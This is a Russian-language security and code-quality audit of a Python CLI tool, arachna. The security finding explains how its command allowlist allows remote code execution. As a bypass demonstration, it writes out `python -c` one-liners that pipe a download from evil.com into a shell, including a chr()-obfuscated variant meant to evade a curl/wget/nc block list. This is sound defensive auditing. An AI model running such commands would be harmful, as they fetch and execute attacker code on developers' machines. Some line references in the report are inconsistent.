## Безопасность

### [CRITICAL] src/arachna/runner.py:131-143 — RCE через command в .arachna.json

**Статус**: не исправлено с предыдущего аудита.
**Суть**: `run_command` исполняет `command` из профиля через `shell=True` при наличии shell-метасимволов. `_ALLOWED_COMMANDS` содержит `python`, `node`, `ruby`, `perl`, `php` — пять интерпретаторов. Каждый может выполнить произвольный код: `python -c "import os; os.system('curl evil.com | sh')"`. Строковый фильтр `_BLOCKED_PATTERNS` не блокирует `python -c`, потому что проверяет только подстроки `curl`, `wget`, `nc` и т.д.

**Влияние сейчас**: любой публичный репозиторий с вредоносным `.arachna.json` выполняет код на машине разработчика. README предупреждает "Only use .arachna.json from trusted sources", но это не защита.

**Риск при росте**: supply chain атака. Пользователь клонирует репозиторий с демо-проектом, запускает `arachna --all` — вредоносный код выполнен. Предыдущий аудитор отметил это как CRITICAL, но интерпретаторы остались в allowlist.

**Демонстрация обхода**:

    # _ALLOWED_COMMANDS содержит "python", _BLOCKED_PATTERNS содержит "curl"
    # Обход: python выполняет код без curl в строке
    python -c "import urllib.request; urllib.request.urlopen('http://evil.com/...')"
    
    # Или через cat + eval — ни curl, ни wget в строке:
    python -c "exec('import os; os.system(chr(99)+chr(117)+chr(114)+chr(108)+chr(32)+chr(101)+chr(118)+chr(105)+chr(108)+chr(46)+chr(99)+chr(111)+chr(109))')"

**Рекомендация**: убрать `python`, `node`, `ruby`, `perl`, `php` из `_ALLOWED_COMMANDS`. Оставить только read-only утилиты: `git`, `tree`, `cat`, `grep`, `find`, `ls`, `wc`, `sort`, `uniq`, `head`, `tail`, `cut`, `tr`, `sed`, `awk`, `date`, `env`, `pwd`, `diff`, `echo`. Интерпретаторы — только через отдельный флаг `--allow-scripts` с интерактивным подтверждением.

## Архитектура

### [HIGH] src/arachna/splitter.py:3,19-35 — splitter игнорирует кастомный токенизатор (production-баг)

**Статус**: подтверждён в текущем коде, не исправлен.
**Суть**: `splitter.py` импортирует `count_tokens` напрямую из `tokenizer.py` на строке 3. Функция `split()` на строках 13-34 принимает параметр `tokenizer`, но он используется только в `split()`. Внутренние функции `_build_parts()` (строка 36) и `_handle_single()` (строка 74) **не принимают** параметр `tokenizer` — они всегда используют `count_tokens` напрямую через импорт. Результат: при кастомном токенизаторе сбор секций считает токены точно, а разбивка на части — всегда дефолтным 4 chars/token.

Путь бага в коде:

    # splitter.py строка 3: жёсткий импорт
    from .tokenizer import count_tokens
    
    # splitter.py строка 19: tokenizer принимается, но...
    def split(raw_content, max_tokens, mode, marker, separator, tokenizer=None):
        tk = tokenizer if tokenizer is not None else count_tokens
        # ... используется только для _split_to_sections, но не для _build_parts
    
    # splitter.py строка 48: _build_parts — всегда count_tokens
    def _build_parts(sections, max_tokens, separator, tokenizer=None):
        tk = tokenizer if tokenizer is not None else count_tokens  # tokenizer=None всегда!
        # ...
    
    # splitter.py строка 74: _handle_single — всегда count_tokens
    def _handle_single(text, max_tokens, tokenizer=None):
        tk = tokenizer if tokenizer is not None else count_tokens  # tokenizer=None всегда!

**Влияние сейчас**: молчаливое превышение `max_tokens` при использовании кастомного токенизатора. Пользователь настраивает точный tiktoken, а splitter режет дефолтным 4 chars/token. Части могут быть на 25-30% больше заявленного лимита.

**Риск при росте**: баг существует с момента добавления pluggable tokenizer (v0.6.0 по CHANGELOG). Не обнаружен тестами, потому что splitter тесты вызывают `_build_parts` и `_handle_single` напрямую без параметра tokenizer.

**Исправление**: добавить параметр `tokenizer` в сигнатуры `_build_parts()` и `_handle_single()`. В `split()` пробрасывать `tk` в вызовы `_build_parts(sections, max_tokens, separator, tk)` и `_handle_single(raw_content, max_tokens, tk)`.

### [HIGH] src/arachna/gatherer.py:16 — глобальное состояние _TOKENIZE

**Статус**: не исправлено с предыдущего аудита.
**Суть**: модульная переменная `_TOKENIZE` на строке 16 и функции `get_tokenizer()`/`set_tokenizer()` меняют глобальное состояние. При использовании arachna как библиотеки несколько вызовов с разными токенизаторами будут мешать друг другу. Тесты вынуждены использовать `patch` для изоляции.

**Влияние сейчас**: тесты gatherer зависят от порядка выполнения. Потенциальный источник flaky tests.

**Риск при росте**: блокирует многопоточное использование arachna как библиотеки. Каждый вызов `set_tokenizer()` — глобальный сайд-эффект.

**Дополнительно**: `dry_run()` в gatherer.py (строка 128) создаёт локальный `tk`, но передаёт его не во все вызовы. Вызов `split()` на строке 149 **не получает** tokenizer:

    # gatherer.py строка 149 — tokenizer не передан

При этом сигнатура `split()` принимает `tokenizer` параметром, но из-за бага в splitter (H-01) он не добирается до `_build_parts`.

**Исправление**: завершить dependency injection — передавать tokenizer параметром во все функции. Глобальную переменную оставить deprecated для обратной совместимости.

### [HIGH] src/arachna/collector.py:33-40 — save_manifest без атомарной записи

**Статус**: не исправлено с предыдущего аудита.
**Суть**: `save_manifest()` на строках 33-54 использует атомарную запись через `tempfile + os.replace`, но fallback на строке 54 делает прямое `write_text()` без атомарности. **Влияние сейчас**: низкое для CLI-утилиты. Краш во время записи манифеста через fallback оставит повреждённый JSON.

**Риск при росте**: при интеграции в CI/CD или IDE-плагины параллельные запуски станут реальностью.

**Исправление**: убрать fallback на `write_text()` — если атомарная запись не удалась, лучше не писать манифест вообще, чем писать повреждённый. Для конкурентного доступа добавить filelock в v1.0.0.

## Тестопригодность

### [HIGH] tests/ — os.chdir блокирует параллельный запуск тестов

**Статус**: не исправлено с предыдущего аудита.
**Суть**: большинство тестов (collector, config, gatherer, main, init, cache) делают `os.chdir(tmpdir)` — это меняет глобальное состояние процесса. При параллельном запуске через pytest-xdist тесты будут мешать друг другу. Пример из `tests/collector/test_collect.py`:

    wd = os.getcwd()
    os.chdir(d)
    try:
        created = collect(...)
    finally:
        os.chdir(wd)

В некоторых тестах (gatherer) `os.chdir` сочетается с `patch("pathlib.Path.cwd", ...)` — двойное патчение глобального состояния.

**Влияние сейчас**: pytest-xdist не работает. 180+ тестов идут последовательно.

**Риск при росте**: при 300+ тестах время прогона станет проблемой для CI/CD.

**Исправление**: перейти на `tmp_path` (pytest fixture) + `monkeypatch.chdir`. Убрать двойное патчение cwd.

### [MEDIUM] tests/runner/test_run_command.py — зависимость от системных утилит

**Статус**: не исправлено с предыдущего аудита.

**Влияние сейчас**: тесты не кроссплатформенные. CI/CD на Windows будет красным.

**Риск при росте**: arachna заявляет поддержку Python 3.11+, но тесты завязаны на Unix.

**Исправление**: замокать `subprocess.run` во всех тестах runner. Системные вызовы вынести в интеграционные тесты.
